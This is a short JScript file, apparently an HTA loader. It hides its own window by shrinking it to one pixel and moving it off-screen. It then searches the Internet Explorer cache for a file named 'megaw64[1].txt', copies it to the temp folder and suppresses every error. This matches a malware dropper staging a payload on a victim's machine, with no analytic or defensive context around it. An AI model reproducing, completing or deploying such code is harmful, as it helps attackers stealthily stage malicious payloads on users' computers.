/////////////////////////////////////////////////////////////////////////////////////////////
//<script language="javascript">

var fso = new ActiveXObject("Scripting.FileSystemObject");
var foundCount = 0;
var shell = new ActiveXObject("WScript.Shell");
var appPath;
var tmpPath;
var sPath;
var sName = "megaw64";

call_main();

function call_main()
{
	try
	{
		window.resizeTo(1,1);
		window.moveTo(5000,5000);
		call_sub();
		window.close();
	}
	catch (e)
	{
		window.close();
	}
	
	return;
}

function sleep(milliseconds) 
{
	var delay = Math.ceil(milliseconds / 1000) + 1;
	shell.Run("ping 127.0.0.1 -n " + delay, 0, true);
}

function call_sub()
{
	try
	{
		sleep(3);
		DeepSearch();
		startCopy();
	}
	catch (e)
	{
	}
	
	return;
}

function startCopy()
{
	try {
		var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
		var fileName = sName + "[1]" + ".txt";
		var dPath = tempPath + "\\" + fileName;
		fso.CopyFile(sPath, dPath, true); 
		//shell.popup(sPath, 0, "msg", 64);
		sPath = dPath;
	} 
	catch (e) {
	}
}

function DeepSearch() 
{
	foundCount = 0;
	var fileName = sName + "[1]" + ".txt";
	var shellApp = new ActiveXObject("Shell.Application");
	var cachePath = shellApp.Namespace(32).Self.Path;
	
	recursiveSearch(cachePath, fileName);
}

function recursiveSearch(folderPath, fileName) 
{
	try {
		var folder = fso.GetFolder(folderPath);

                var files = new Enumerator(folder.Files);
                for (; !files.atEnd(); files.moveNext()) {
			var file = files.item();
			if (file.Name.toLowerCase() === fileName.toLowerCase()) {
				sPath = file.Path;
				foundCount++;
			}
                }

                var subFolders = new Enumerator(folder.SubFolders);
                for (; !subFolders.atEnd(); subFolders.moveNext()) {
                    recursiveSearch(subFolders.item().Path, fileName);
		}
	} 
	catch (e) {
	}
}

//</script>
/////////////////////////////////////////////////////////////////////////////////////////////
